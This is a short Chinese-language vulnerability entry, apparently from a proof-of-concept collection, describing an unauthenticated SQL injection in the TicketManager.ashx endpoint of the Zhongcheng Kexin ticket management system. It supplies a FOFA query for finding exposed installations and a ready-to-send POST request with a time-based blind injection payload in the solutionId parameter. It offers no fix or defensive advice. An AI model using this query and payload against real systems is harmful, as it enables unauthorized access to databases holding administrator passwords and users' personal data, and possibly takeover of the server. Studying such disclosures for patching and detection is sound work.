## 中成科信票务管理系统TicketManager.ashx存在SQL注入漏洞

中成科信票务管理系统 TicketManager.ashx 接口处存在SQL注入漏洞复现，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa

```yaml
body="技术支持：北京中成科信科技发展有限公司"
```

## poc

```java
POST /SystemManager/Api/TicketManager.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/x-www-form-urlencoded
Connection: close
 
Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:5'--
```

